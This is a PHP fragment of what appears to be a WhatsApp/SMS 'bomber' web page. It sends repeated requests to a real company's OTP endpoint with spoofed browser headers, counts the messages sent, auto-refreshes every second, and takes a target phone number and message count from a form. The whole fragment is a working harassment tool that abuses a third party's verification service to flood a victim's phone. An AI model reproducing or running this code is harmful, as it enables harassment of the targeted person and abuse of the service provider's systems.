...
/*  URL , HEADERS &  DATA     */
$url1='https://api.spinny.com/api/c/user/otp-request/';
$data1= '{"contact_number":"'.$number.'","whatsapp":true,"code_len":4}';
$headers1= ['Host: api.spinny.com','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36','Content-Type: application/json','Accept: */*','Origin: https://www.spinny.com','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];
...
/**************************************/
  ...
  echo "<span class='bomb-count'>Total Send Message => ".$currentlimit."</span>";
  ...
  echo "<meta http-equiv='refresh' content='1'>";
    ...
    echo'<div class="form">
      <form action="" method="GET">
          <input class="forminput" type="number" name="number" placeholder="Enter WhatsApp No. " />
          <input class="forminput"type="number" name="countnumber" placeholder="Enter No. Of Message" />
